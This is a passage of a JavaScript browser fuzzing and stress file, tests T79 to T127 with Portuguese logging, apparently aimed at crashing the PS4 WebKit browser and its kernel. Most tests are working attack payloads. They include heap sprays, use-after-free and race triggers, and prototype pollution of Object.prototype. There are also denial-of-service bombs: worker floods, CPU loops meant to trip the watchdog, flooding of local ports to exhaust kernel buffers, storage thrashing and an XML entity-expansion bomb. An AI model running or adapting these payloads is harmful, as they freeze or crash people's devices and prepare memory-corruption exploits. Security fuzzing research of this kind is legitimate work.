            log(">> T79: Scroll flood finish. Events: " + count);
        }
    }, 1); 
}

function runTest80() {
    log("Iniciando T80: Iframe Sandbox Violation...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var i = setInterval(function() {
        var f = document.createElement('iframe');
        // Sandbox restrito tentando executar script via srcdoc (Kernel check violation)
        f.setAttribute("sandbox", "allow-same-origin"); 
        f.srcdoc = "<script>while(1);<\/script>";
        container.appendChild(f);
        
        var f2 = document.createElement('iframe');
        f2.setAttribute("sandbox", "allow-scripts");
        f2.src = "data:text/html,<script>parent.log('try');<\/script>";
        container.appendChild(f2);
        
        if(container.childNodes.length > 50) {
            container.innerHTML = "";
            log(".. Sandbox cycle");
        }
    }, 100);
    
    setTimeout(function() {
        clearInterval(i);
        log(">> T80: Sandbox stress stopped.");
    }, 3000);
}
function runTest81() {
    log("Iniciando T81: DOM Token List Toggle Race...");
    var el = document.createElement('div');
    var cls = el.classList;
    var count = 0;
    var classes = [];
    for(var i=0; i<1000; i++) classes.push("c" + i);
    
    try {
        var t = setInterval(function() {
            for(var j=0; j<200; j++) {
                var c = classes[Math.floor(Math.random() * classes.length)];
                cls.toggle(c); 
            }
            if(cls.length > 500) {
                el.className = ""; 
                var spray = new Uint32Array(0x100).fill(0x41414141);
            }
            count++;
            if(count > 1000) {
                clearInterval(t);
                log(">> T81: ClassList thrashing done.");
            }
        }, 0);
    } catch(e) { log(">> T81 Erro: " + e.message); }
}

function runTest82() {
    log("Iniciando T82: WeakMap GC Thrashing...");
    var wm = new WeakMap();
    var cycles = 0;
    
    function churn() {
        var root = {};
        for(var i=0; i<5000; i++) {
            var k = {id: i};
            var v = new Uint8Array(1024); 
            wm.set(k, v);
        }
        cycles++;
        if(cycles % 10 === 0) log(".. GC Cycle " + cycles);
        
        if(cycles < 50) setTimeout(churn, 10); 
        else log(">> T82: WeakMap stress complete.");
    }
    churn();
}

function runTest83() {
    log("Iniciando T83: Text Node Split/Normalize...");
    var d = document.createElement('div');
    d.appendChild(document.createTextNode("A".repeat(10000)));
    document.body.appendChild(d);
    
    try {
        for(var i=0; i<2000; i++) {
            var node = d.firstChild;
            if(node && node.nodeType === 3) {
                var split = node.splitText(5000); 
                d.normalize(); 
                
                if(i % 100 === 0) {
                    var r = document.createRange();
                    r.selectNode(d); 
                    r.detach();
                }
            } else {
                d.textContent = "A".repeat(10000);
            }
        }
        document.body.removeChild(d);
        log(">> T83: Text operations finished.");
    } catch(e) { log(">> T83 Crash Logic: " + e.message); }
}

function runTest84() {
    log("Iniciando T84: Property Hash Collision...");
    var obj = {};
    var count = 0;
    
    try {
        // Gera chaves que tendem a colidir em algoritmos de hash simples
        for(var i=0; i<20000; i++) {
            var key = "key_" + i.toString(36) + "_" + (i*31);
            obj[key] = i;
            
            if(i % 1000 === 0) {
                delete obj["key_" + (i-500).toString(36) + "_" + ((i-500)*31)];
            }
        }
        
        var seek = 0;
        for(var k in obj) { seek++; }
        
        log(">> T84: Hash table stress. Keys: " + seek);
    } catch(e) {
        log(">> T84 OOM/Limit: " + e.message);
    }
}

function runTest85() {
    log("Iniciando T85: FormData Multipart Flood...");
    var fd = new FormData();
    var blob = new Blob(["x".repeat(1024)], {type: 'application/octet-stream'});
    
    try {
        for(var i=0; i<5000; i++) {
            fd.append("file" + i, blob, "filename" + i + ".bin");
        }
        
        var req = new XMLHttpRequest();
        req.open("POST", "/dump");
        // Serialização interna do FormData pode estourar buffer
        req.send(fd);
        
        log(">> T85: Huge Multipart payload built.");
    } catch(e) {
        log(">> T85 Serialization Fail: " + e.message);
    }
}

function runTest86() {
    log("Iniciando T86: Worker Thread Bomb...");
    var workers = [];
    var code = "self.onmessage=function(){var i=0;while(true)i++;}"; 
    var blob = new Blob([code], {type: 'application/javascript'});
    var url = URL.createObjectURL(blob);
    
    try {
        var t = setInterval(function() {
            var w = new Worker(url);
            w.postMessage("start");
            workers.push(w);
            
            if(workers.length > 20) { 
                var dead = workers.shift();
                dead.terminate();
            }
            log(".. Thread cycle active");
            
            if(workers.length > 200) clearInterval(t); 
        }, 100);
        
        setTimeout(function() {
            clearInterval(t);
            workers.forEach(w => w.terminate());
            log(">> T86: Thread limit stress stop.");
        }, 5000);
    } catch(e) { log(">> T86 System Limit: " + e.message); }
}

function runTest87() {
    log("Iniciando T87: Sync File Read Lock...");
    var readers = [];
    var huge = new Uint8Array(1024 * 1024 * 5).fill(65);
    var b = new Blob([huge]);
    
    try {
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            // Leitura síncrona não existe em FileReader padrão, mas simulamos carga pesada
            // disparando múltiplos reads simultâneos em blob grande
            fr.readAsDataURL(b); 
            readers.push(fr);
            
            if(i % 10 === 0) {
                var junk = new ArrayBuffer(1024 * 1024); 
            }
        }
        log(">> T87: I/O buffers saturated.");
    } catch(e) { log(">> T87 Erro: " + e.message); }
}

function runTest88() {
    log("Iniciando T88: Table Layout Recalc OOM...");
    var t = document.createElement('table');
    document.body.appendChild(t);
    t.style.tableLayout = "auto"; 
    
    try {
        for(var r=0; r<200; r++) {
            var row = t.insertRow();
            for(var c=0; c<50; c++) {
                var cell = row.insertCell();
                cell.textContent = "W" + c + "H" + r + " ".repeat(r % 10);
            }
        }
        
        // Força "Reflow" massivo alterando larguras
        setTimeout(function() {
            t.style.width = "10px";
            var x = t.offsetWidth; 
            t.style.width = "10000px";
            var y = t.offsetWidth;
            document.body.removeChild(t);
            log(">> T88: Table Layout Thrashing done.");
        }, 100);
    } catch(e) { log(">> T88 Render Fail: " + e.message); }
}

function runTest89() {
    log("Iniciando T89: Math.pow Watchdog Kill...");
    var res = 0;
    var start = Date.now();
    
    try {
        // Loop "quase" infinito para disparar o watchdog do kernel
        // PS4 mata processos que seguram a CPU por muito tempo
        while(Date.now() - start < 3000) {
            for(var i=0; i<1000; i++) {
                res = Math.pow(Math.random(), Math.random());
            }
            // Pequena pausa para enganar detecção simples, mas manter carga alta
            var arr = new Uint8Array(100); 
        }
        log(">> T89: CPU Stress Test Survived.");
    } catch(e) {
        log(">> T89 Watchdog: " + e.message);
    }
}

function runTest90() {
    log("Iniciando T90: Huge URL Search Params...");
    var params = new URLSearchParams();
    var val = "X".repeat(1000);
    
    try {
        for(var i=0; i<10000; i++) {
            params.append("k"+i, val);
        }
        
        var str = params.toString();
        log(".. Params string len: " + str.length);
        
        var reparse = new URLSearchParams(str);
        reparse.forEach(function(v, k) {
             if(k === "k5000") {
                 reparse.delete("k0"); 
                 var hole = new ArrayBuffer(1024);
             }
        });
        
        log(">> T90: URL parsing/serialization OOM test.");
    } catch(e) {
        log(">> T90 Memory Fail: " + e.message);
    }
}
function runTest91() {
    log("Iniciando T91: TreeWalker Filter UAF...");
    var root = document.createElement('div');
    root.innerHTML = "<div><span></span><b></b></div>".repeat(100);
    document.body.appendChild(root);
    
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node.tagName === 'SPAN') {
                node.parentNode.removeChild(node);
                var spray = new Uint8Array(0x20).fill(0x41);
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    }, false);
    
    try {
        while(walker.nextNode()) {
            var curr = walker.currentNode;
            if(curr) curr.textContent = "uaf";
        }
        log(">> T91: TreeWalker traversal finished.");
    } catch(e) { log(">> T91 Erro: " + e.message); }
    document.body.removeChild(root);
}

function runTest92() {
    log("Iniciando T92: Array Concat Spread Poison...");
    var a = [1, 2, 3];
    var p = new Proxy([], {
        get: function(target, prop) {
            if(prop === Symbol.isConcatSpreadable) {
                a.length = 0;
                var junk = new Array(10000).fill(1.1);
                return true;
            }
            if(prop === 'length') return 0xFFFFFFFF;
            return 1;
        }
    });
    
    try {
        var res = a.concat(p);
        log(">> T92: Concat executed. Len: " + res.length);
    } catch(e) {
        log(">> T92 Logic Error: " + e.message);
    }
}

function runTest93() {
    log("Iniciando T93: RegExp LastIndex Overflow...");
    var re = /a/g;
    var str = "a".repeat(1000);
    var count = 0;
    
    try {
        re.lastIndex = 0xFFFFFFF0; 
        
        while(re.exec(str) !== null) {
            count++;
            if(count > 10) break;
        }
        
        re.lastIndex = { valueOf: function() { 
            str = "b".repeat(1000); 
            return 0; 
        }};
        
        re.exec(str);
        log(">> T93: RegExp state manipulation done.");
    } catch(e) { log(">> T93 Erro: " + e.message); }
}

function runTest94() {
    log("Iniciando T94: Textarea Layout Thrashing...");
    var t = document.createElement('textarea');
    document.body.appendChild(t);
    var val = "X".repeat(500);
    
    try {
        for(var i=0; i<1000; i++) {
            t.value = val;
            t.cols = i % 100;
            t.rows = i % 50;
            
            if(i % 10 === 0) {
                t.style.position = (i%2===0) ? "absolute" : "fixed";
                var r = t.getBoundingClientRect(); 
                t.wrap = (i%2===0) ? "off" : "soft";
            }
        }
        log(">> T94: Layout object stressed.");
    } catch(e) { log(">> T94 Erro: " + e.message); }
    document.body.removeChild(t);
}

function runTest95() {
    log("Iniciando T95: FontFace Recursive Load...");
    var fonts = [];
    var depth = 0;
    
    function loadNext() {
        depth++;
        if(depth > 500) return;
        var f = new FontFace('f'+depth, 'url(data:font/woff;base64,AAAA...)');
        fonts.push(f);
        document.fonts.add(f);
        f.load().then(function() {
            loadNext();
            if(depth % 50 === 0) document.fonts.clear();
        }).catch(function(){});
    }
    
    loadNext();
    setTimeout(function() {
        log(">> T95: Font recursion depth: " + depth);
    }, 2000);
}

function runTest96() {
    log("Iniciando T96: Local Port mbuf Exhaustion...");
    var imgs = [];
    var port = 10000;
    
    var t = setInterval(function() {
        for(var i=0; i<50; i++) {
            var img = new Image();
            img.src = "http://127.0.0.1:" + port + "/socket_flood";
            imgs.push(img);
            port++;
        }
        
        if(imgs.length > 5000) {
            // Mantém referências vivas para segurar o socket no kernel (estado SYN_SENT)
            imgs = imgs.slice(2500); 
        }
        
        if(port > 60000) {
            clearInterval(t);
            log(">> T96: Port range scanned/flooded.");
        }
    }, 10);
}

function runTest97() {
    log("Iniciando T97: Blob URL Revocation Race...");
    var urls = [];
    var data = new Uint8Array(1024*1024).fill(0x90);
    var b = new Blob([data]);
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            var u = URL.createObjectURL(b);
            urls.push(u);
        }
        
        while(urls.length > 0) {
            var target = urls.shift();
            URL.revokeObjectURL(target);
            // Race: Tenta usar URL revogada imediatamente
            var x = new XMLHttpRequest();
            x.open("GET", target, true);
            try { x.send(); } catch(e){}
        }
        
        if(Math.random() > 0.95) log(".. Race cycle active");
    }, 20);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T97: Blob race stopped.");
    }, 3000);
}

function runTest98() {
    log("Iniciando T98: Iframe Nesting Depth Kill...");
    var d = document.createElement('div');
    document.body.appendChild(d);
    var html = "";
    
    for(var i=0; i<4000; i++) {
        html += "<div>";
    }
    html += "<span>Bottom</span>";
    for(var i=0; i<4000; i++) {
        html += "</div>";
    }
    
    try {
        d.innerHTML = html;
        var targets = d.getElementsByTagName("div");
        log(".. Deep DOM created. Nodes: " + targets.length);
        
        // Força renderização pesada
        var h = d.offsetHeight; 
        d.innerHTML = "";
        log(">> T98: Deep nesting parsed and cleared.");
    } catch(e) {
        log(">> T98 Stack Overflow: " + e.message);
    }
}

function runTest99() {
    log("Iniciando T99: Canvas Gradient Mem Leak...");
    var c = document.createElement('canvas');
    c.width = 2000; c.height = 2000;
    var ctx = c.getContext('2d');
    
    try {
        for(var i=0; i<5000; i++) {
            var g = ctx.createLinearGradient(0, 0, 2000, 2000);
            for(var j=0; j<100; j++) {
                g.addColorStop(j/100, "rgb("+ (i%255) +",0,0)");
            }
            ctx.fillStyle = g;
            ctx.fillRect(0,0,100,100);
            
            if(i % 1000 === 0) log(".. Gradients created: " + i);
        }
        log(">> T99: GPU Gradient buffer stress.");
    } catch(e) { log(">> T99 GPU OOM: " + e.message); }
}

function runTest100() {
    log("Iniciando T100: THE OMEGA COMBO...");
    var running = true;
    
    // 1. Thread Stress
    var b = new Blob(["while(true) Math.random();"], {type:'text/javascript'});
    var w = new Worker(URL.createObjectURL(b));
    
    // 2. Memory Stress
    var arr = [];
    var memInt = setInterval(function() {
        if(!running) return;
        try { arr.push(new ArrayBuffer(1024*1024*10)); } catch(e){}
    }, 100);
    
    // 3. DOM/Layout Stress
    var domInt = setInterval(function() {
        if(!running) return;
        var d = document.createElement('div');
        d.innerHTML = "X".repeat(10000);
        document.body.appendChild(d);
        var x = d.offsetWidth;
        document.body.removeChild(d);
    }, 10);
    
    // 4. History Stress
    var histInt = setInterval(function() {
        if(!running) return;
        try { history.pushState({}, "t", "?t="+Math.random()); } catch(e){}
    }, 50);

    setTimeout(function() {
        running = false;
        w.terminate();
        clearInterval(memInt);
        clearInterval(domInt);
        clearInterval(histInt);
        arr = null;
        log(">> T100: Combo finished. Check system stability.");
    }, 5000);
}
function runTest101() {
    log("Iniciando T101: Attribute Node SetNamedItem Race...");
    var el = document.createElement('div');
    var attr = document.createAttribute('test');
    attr.value = "A".repeat(100);
    var running = true;
    
    setTimeout(function() { running = false; log(">> T101: Race stopped."); }, 3000);
    
    function race() {
        if(!running) return;
        try {
            el.setAttributeNode(attr);
            var removed = el.removeAttributeNode(attr);
            if(Math.random() > 0.5) {
                removed.value = "B".repeat(200); 
            }
            // Tenta corromper a referência do atributo reutilizando-o imediatamente
            el.setAttributeNode(removed);
        } catch(e) {}
        setTimeout(race, 0);
    }
    race();
}

function runTest102() {
    log("Iniciando T102: Event Listener Remove-Add Loop...");
    var t = document.createElement('div');
    var count = 0;
    
    function handler() {
        count++;
        var junk = new Uint32Array(100);
    }
    
    try {
        for(var i=0; i<10000; i++) {
            t.addEventListener('click', handler);
            if(i % 2 === 0) t.removeEventListener('click', handler);
            
            if(i % 1000 === 0) {
                // Força re-indexing da lista interna de listeners
                var ev = new Event('click');
                t.dispatchEvent(ev);
            }
        }
        log(">> T102: Listener list churn finished.");
    } catch(e) { log(">> T102 Erro: " + e.message); }
}

function runTest103() {
    log("Iniciando T103: Canvas GetContext Type Flip...");
    var c = document.createElement('canvas');
    var count = 0;
    
    try {
        for(var i=0; i<500; i++) {
            // Tenta confundir o estado interno do canvas pedindo contextos diferentes
            // Mesmo que spec diga que retorna null, a implementação pode falhar na limpeza
            var ctx2d = c.getContext('2d');
            var ctxGl = c.getContext('webgl'); 
            
            if(ctx2d) {
                ctx2d.fillStyle = "red";
                ctx2d.fillRect(0,0,10,10);
            }
            
            // Recria o elemento para resetar, mas mantém referência antiga no GC
            if(i % 50 === 0) {
                c = document.createElement('canvas');
                c.width = 1000; c.height = 1000;
            }
            count++;
        }
        log(">> T103: Context flipping attempts: " + count);
    } catch(e) { log(">> T103 Erro: " + e.message); }
}

function runTest104() {
    log("Iniciando T104: XMLSerializer Recursive Bomb...");
    var doc = document.implementation.createDocument(null, "root", null);
    var root = doc.documentElement;
    var curr = root;
    
    // Cria árvore XML muito profunda
    for(var i=0; i<3000; i++) {
        var el = doc.createElement("node");
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var s = new XMLSerializer();
        var str = s.serializeToString(doc);
        log(">> T104: Serialized length: " + str.length);
    } catch(e) {
        log(">> T104 Stack Overflow: " + e.message);
    }
}

function runTest105() {
    log("Iniciando T105: Object GetOwnPropertyDescriptor Stress...");
    var obj = {};
    for(var i=0; i<2000; i++) obj["p"+i] = i;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 2000) {
            for(var i=0; i<2000; i++) {
                var d = Object.getOwnPropertyDescriptor(obj, "p"+i);
                if(d.value !== i) throw "Corruption";
                
                // Cria objetos descritores temporários rapidamento
                if(i % 100 === 0) {
                    Object.defineProperty(obj, "p"+i, {enumerable: false});
                }
            }
        }
        log(">> T105: Descriptor allocation stress done.");
    } catch(e) { log(">> T105 Erro: " + e.message); }
}

function runTest106() {
    log("Iniciando T106: Iframe Src Blob Recursion...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    
    var html = "<script>if(window.parent) window.parent.postMessage('ping', '*');<\/script>";
    var blob = new Blob([html], {type: 'text/html'});
    var url = URL.createObjectURL(blob);
    var frames = [];
    
    var t = setInterval(function() {
        var f = document.createElement('iframe');
        f.src = url;
        container.appendChild(f);
        frames.push(f);
        
        if(frames.length > 200) {
            container.removeChild(frames.shift());
        }
        
        if(frames.length > 500) {
             clearInterval(t);
             log(">> T106: Frame cycle finished.");
        }
    }, 20);
}

function runTest107() {
    log("Iniciando T107: XHR Abort Race Condition...");
    var reqs = [];
    
    var t = setInterval(function() {
        for(var i=0; i<10; i++) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/" + Math.random(), true);
            xhr.send();
            reqs.push(xhr);
            
            // Aborta imediatamente enquanto ainda está conectando
            // Tenta causar uso de ponteiro inválido no callback interno
            xhr.abort();
            
            // Reutiliza objeto abortado (algumas implementações antigas crashavam aqui)
            try { xhr.open("GET", "/", true); } catch(e){}
        }
        
        if(reqs.length > 2000) {
            reqs = [];
            log(".. XHR pool flushed");
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T107: Network race stopped.");
    }, 3000);
}

function runTest108() {
    log("Iniciando T108: FileReader Sync Freeze...");
    var b = new Blob(["A".repeat(1024*1024*2)]);
    var readers = [];
    
    try {
        // Dispara múltiplas leituras simultâneas de blob grande
        for(var i=0; i<50; i++) {
            var fr = new FileReader();
            fr.readAsDataURL(b);
            readers.push(fr);
            
            // Força GC no blob original durante a leitura
            if(i === 25) {
                b = new Blob(["X"]); 
                var spray = new Uint8Array(1024*1024).fill(0xCC);
            }
        }
        log(">> T108: File readers queued.");
    } catch(e) { log(">> T108 Erro: " + e.message); }
}

function runTest109() {
    log("Iniciando T109: Huge Math Random Buffer...");
    var size = 1024 * 1024 * 20; // 20MB floats
    try {
        var f32 = new Float32Array(size);
        var start = Date.now();
        
        // Loop otimizado para preencher memória rapidamente
        for(var i=0; i<size; i+=8) {
            var r = Math.random();
            f32[i] = r; f32[i+1] = r; f32[i+2] = r; f32[i+3] = r;
            f32[i+4] = r; f32[i+5] = r; f32[i+6] = r; f32[i+7] = r;
        }
        
        // Tenta soma massiva para forçar paginação
        var sum = 0;
        for(var j=0; j<size; j+=100) sum += f32[j];
        
        log(">> T109: Buffer processed in " + (Date.now()-start) + "ms");
    } catch(e) {
        log(">> T109 OOM: " + e.message);
    }
}

function runTest110() {
    log("Iniciando T110: DOM Imp CreateDoc Flood...");
    var docs = [];
    var imp = document.implementation;
    
    try {
        var t = setInterval(function() {
            for(var i=0; i<50; i++) {
                // Cria documentos XML desconectados
                var d = imp.createDocument(null, "root"+i, null);
                var el = d.createElement("child");
                el.textContent = "Data".repeat(100);
                d.documentElement.appendChild(el);
                docs.push(d);
            }
            
            if(docs.length > 5000) {
                // Destrói referências em massa
                docs = []; 
                log(".. Documents flushed (GC pressure)");
            }
        }, 20);
        
        setTimeout(function() {
            clearInterval(t);
            log(">> T110: Document flood stopped.");
        }, 4000);
    } catch(e) { log(">> T110 Erro: " + e.message); }
}
function runTest111() {
    log("Iniciando T111: Array Buffer Neutering Race...");
    var ab = new ArrayBuffer(1024 * 1024);
    var w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){postMessage(e.data,[e.data]);}"],{type:'js'})));
    var count = 0;
    
    var t = setInterval(function() {
        try {
            if(ab.byteLength > 0) {
                w.postMessage(ab, [ab]);
                // Tenta acessar buffer transferido imediatamente
                var view = new Uint8Array(ab);
                view[0] = 1; 
            } else {
                ab = new ArrayBuffer(1024 * 1024);
                // Heap Spray para preencher o vazio
                var spray = new Array(100).fill(new Float64Array(128));
            }
            count++;
            if(count > 2000) {
                clearInterval(t);
                w.terminate();
                log(">> T111: Neutering cycle finished.");
            }
        } catch(e) {}
    }, 1);
}

function runTest112() {
    log("Iniciando T112: Prototype Pollution Chain...");
    var root = Object.prototype;
    var chain = [];
    
    try {
        for(var i=0; i<5000; i++) {
            var key = "prop_" + Math.random().toString(36).substring(7);
            Object.defineProperty(root, key, {
                get: function() { 
                    var temp = new Uint8Array(1024);
                    return temp.fill(0x41); 
                },
                configurable: true
            });
            chain.push(key);
            
            if(i % 100 === 0) {
                // Força iteração em objeto limpo para disparar getters poluidos
                var clean = {};
                for(var k in clean) {}
            }
        }
        
        chain.forEach(k => delete root[k]);
        log(">> T112: Global prototype stressed.");
    } catch(e) { log(">> T112 Limit: " + e.message); }
}

function runTest113() {
    log("Iniciando T113: Event Dispatch Recursive Trap...");
    var d = document.createElement('div');
    var depth = 0;
    
    d.addEventListener('click', function(e) {
        depth++;
        if(depth < 2000) {
            var evt = new MouseEvent('click', {bubbles: true, cancelable: true});
            // Tenta modificar o evento durante o dispatch
            Object.defineProperty(evt, 'target', {value: null});
            d.dispatchEvent(evt);
        } else {
            var heavy = new Array(5000).join('x');
        }
    });
    
    try {
        d.dispatchEvent(new MouseEvent('click'));
        log(">> T113: Recursion depth: " + depth);
    } catch(e) { log(">> T113 Stack: " + e.message); }
}

function runTest114() {
    log("Iniciando T114: DOMStringMap Property Flood...");
    var el = document.createElement('div');
    var ds = el.dataset;
    var count = 0;
    
    try {
        var start = Date.now();
        while(Date.now() - start < 3000) {
            var key = "data" + count;
            ds[key] = "val" + count; 
            
            // Remove aleatoriamente para fragmentar
            if(count % 2 === 0) delete ds["data" + (count - 1)];
            
            if(count % 1000 === 0) {
                // Converte para atributos reais
                var attrs = el.attributes.length;
            }
            count++;
        }
        log(">> T114: Dataset operations: " + count);
    } catch(e) { log(">> T114 Erro: " + e.message); }
}

function runTest115() {
    log("Iniciando T115: Selection Extend Crash...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.contentEditable = true;
    d.innerHTML = "A".repeat(5000);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNodeContents(d);
        s.removeAllRanges();
        s.addRange(r);
        
        for(var i=0; i<1000; i++) {
            s.extend(d, i);
            // Modifica o DOM sob a seleção ativa
            d.innerHTML = "B".repeat(5000 - i); 
            
            if(i % 50 === 0) {
                var junk = document.createTextNode("junk");
                d.appendChild(junk);
                s.extend(junk, 0);
            }
        }
        document.body.removeChild(d);
        log(">> T115: Selection stress finished.");
    } catch(e) { log(">> T115 Erro: " + e.message); }
}

function runTest116() {
    log("Iniciando T116: Canvas 2D Path Explosion...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096;
    var ctx = c.getContext('2d');
    
    if(ctx) {
        ctx.beginPath();
        var points = 100000;
        
        try {
            for(var i=0; i<points; i++) {
                ctx.lineTo(Math.random() * 4000, Math.random() * 4000);
                if(i % 1000 === 0) {
                    // Cria sub-caminhos complexos para estourar buffer de vértices
                    ctx.arc(2000, 2000, i/100, 0, Math.PI*2);
                    ctx.rect(i%100, i%100, 50, 50);
                }
            }
            ctx.fillStyle = "red";
            ctx.fill('evenodd'); 
            log(">> T116: Path rendered with " + points + " nodes.");
        } catch(e) { log(">> T116 GPU Panic: " + e.message); }
    }
}

function runTest117() {
    log("Iniciando T117: XHR Sync Blob Leak...");
    var blobs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, false);
        try {
            xhr.responseType = "blob"; 
            xhr.send();
            if(xhr.response) {
                blobs.push(xhr.response);
            }
            
            // Não libera os blobs, força o kernel a segurar handles de arquivos temp
            if(blobs.length > 500) {
                log(".. Blobs held: " + blobs.length);
                if(blobs.length > 5000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T117 FD Limit: " + e.message);
        }
    }, 10);
}

function runTest118() {
    log("Iniciando T118: LocalStorage Quota Thrasher...");
    localStorage.clear();
    var k = "key";
    var v = "x".repeat(1024*1024); 
    
    try {
        var i = 0;
        while(true) {
            localStorage.setItem(k + i, v);
            i++;
            // Tenta remover e adicionar imediatamente para causar fragmentação no DB
            if(i > 2) {
                localStorage.removeItem(k + (i-2));
                localStorage.setItem(k + (i-2), "small");
            }
            if(i > 100) break; 
        }
    } catch(e) {
        // Quando quota atingida, tenta operação massiva de replace
        try {
            localStorage.clear();
            var huge = "A".repeat(1024 * 1024 * 10);
            localStorage.setItem("KILL", huge);
        } catch(z) {}
        log(">> T118: Storage thrashing trigger.");
    }
}

function runTest119() {
    log("Iniciando T119: Nested Worker Bomber...");
    var code = `
        self.onmessage = function(e) {
            if(e.data > 0) {
                var w = new Worker(self.location.href); // Auto-referência falha em blob, mas...
                // Fallback para loop de memória se worker falhar
                var arr = new Uint32Array(100000);
            }
        };
    `;
    // Usa Blob URL para criar workers que criam workers (se suportado) ou consomem RAM
    var b = new Blob(["var i=0; setInterval(function(){i++; new Float64Array(10000);}, 10);"], {type:'text/javascript'});
    var url = URL.createObjectURL(b);
    var workers = [];
    
    try {
        for(var i=0; i<50; i++) {
            workers.push(new Worker(url));
        }
        setTimeout(function() {
            workers.forEach(w => w.terminate());
            log(">> T119: Worker bomb stop.");
        }, 4000);
        log(">> T119: 50 Workers launched.");
    } catch(e) { log(">> T119 Limit: " + e.message); }
}

function runTest120() {
    log("Iniciando T120: Iframe History State DoS...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    f.onload = function() {
        try {
            var w = f.contentWindow;
            var spam = setInterval(function() {
                for(var i=0; i<50; i++) {
                    w.history.pushState({id: i, junk: new Array(100).join("z")}, "t"+i, "/"+i);
                    count++;
                }
                if(count > 10000) {
                    clearInterval(spam);
                    document.body.removeChild(f);
                    log(">> T120: History flood finish. States: " + count);
                }
            }, 10);
        } catch(e) { log(">> T120 Erro: " + e.message); }
    };
    f.src = "about:blank";
}
function runTest121() {
    log("Iniciando T121: Message Port Transfer Race...");
    var c = new MessageChannel();
    var p1 = c.port1;
    var p2 = c.port2;
    var t = setInterval(function() {
        try {
            // Tenta transferir a porta para ela mesma enquanto posta mensagem
            // Isso estressa o mecanismo de serialização de portas do WebKit
            p1.postMessage("race", [p2]);
            var c_new = new MessageChannel();
            p2 = c_new.port2; 
            
            // Aloca buffers pequenos para forçar GC rápido nas portas antigas
            var trash = new Uint8Array(100);
        } catch(e) {
            clearInterval(t);
            log(">> T121 Race End: " + e.message);
        }
    }, 0);
    
    setTimeout(function() {
        clearInterval(t);
        log(">> T121: Port race stopped.");
    }, 2000);
}

function runTest122() {
    log("Iniciando T122: DOM Parser Recursive Entity...");
    var parser = new DOMParser();
    var xml = '<!DOCTYPE doc [ <!ENTITY x "foo"> <!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"> ]>';
    xml += '<root>' + '&y;'.repeat(1000) + '</root>';
    
    try {
        var res = parser.parseFromString(xml, "text/xml");
        var str = new XMLSerializer().serializeToString(res);
        log(">> T122: Parsed Len: " + str.length);
        
        // Tenta acessar nodos profundos resultantes da expansão
        var walker = document.createTreeWalker(res, NodeFilter.SHOW_TEXT, null, false);
        var count = 0;
        while(walker.nextNode()) count++;
        log(".. Text nodes found: " + count);
    } catch(e) {
        log(">> T122 XML Limit: " + e.message);
    }
}

function runTest123() {
    log("Iniciando T123: Form Validation Bubble Trap...");
    var f = document.createElement('form');
    var i = document.createElement('input');
    i.required = true;
    f.appendChild(i);
    document.body.appendChild(f);
    
    i.addEventListener('invalid', function(e) {
        // Recursão dentro do evento de validação bloqueia a UI thread
        // e cria pressão no stack de eventos
        var div = document.createElement('div');
        div.innerHTML = "X".repeat(1000);
        f.appendChild(div);
        
        if(f.childNodes.length < 2000) {
            i.checkValidity(); 
        } else {
            document.body.removeChild(f);
        }
    });
    
    try {
        i.checkValidity();
        log(">> T123: Validation trap triggered.");
    } catch(e) { log(">> T123 Stack: " + e.message); }
}

function runTest124() {
    log("Iniciando T124: Selection Range Collapse Loop...");
    var s = window.getSelection();
    var d = document.createElement('div');
    d.textContent = "TestData".repeat(100);
    document.body.appendChild(d);
    
    try {
        var r = document.createRange();
        r.selectNode(d);
        s.addRange(r);
        
        for(var i=0; i<5000; i++) {
            // Colapso rápido seguido de extensão força recálculo de layout
            s.collapse(d, 0);
            s.extend(d.firstChild, i % 100);
            
            if(i % 100 === 0) {
                // Modifica o texto para invalidar os offsets da seleção
                d.firstChild.splitText(50);
                d.normalize();
            }
        }
        document.body.removeChild(d);
        log(">> T124: Selection collapse stress done.");
    } catch(e) { log(">> T124 Erro: " + e.message); }
}

function runTest125() {
    log("Iniciando T125: Text Node Data Replace Overflow...");
    var t = document.createTextNode("Start");
    var huge = "A".repeat(10000);
    
    try {
        for(var i=0; i<1000; i++) {
            // replaceData com offset móvel e tamanho crescente
            t.replaceData(0, 5, huge);
            // Corta para evitar estouro imediato de memória JS, focando no churn do buffer interno
            t.data = t.data.substring(0, 100); 
            
            if(i % 50 === 0) {
                var spray = new Uint32Array(0x100).fill(0x12345678);
            }
        }
        log(">> T125: Data replacement cycle finished.");
    } catch(e) { log(">> T125 Erro: " + e.message); }
}

function runTest126() {
    log("Iniciando T126: SetTimeout Heap Flood...");
    var timers = [];
    var count = 0;
    
    function flood() {
        // Cria milhares de timers com closures que seguram memória
        var junk = new Array(100).join("z"); 
        var id = setTimeout(function() {
            var use = junk + count; 
        }, 10000 + count); // Delay longo para acumular no heap do kernel
        timers.push(id);
        count++;
        
        if(count < 50000) {
            // Agenda múltiplos por ciclo de loop para velocidade
            setTimeout(flood, 0);
            setTimeout(flood, 0);
            setTimeout(flood, 0);
        } else {
            log(">> T126: 50k Timers queued.");
        }
    }
    flood();
}

function runTest127() {
    log("Iniciando T127: XHR Response Text OOM...");
    var reqs = [];
    var t = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href, true);
        xhr.onreadystatechange = function() {
            if(this.readyState == 4) {
                // Duplica a resposta na memória várias vezes
                var s = this.responseText;
                var s2 = s + s + s + s; 
                this.temp = s2; 
            }
        };
        xhr.send();
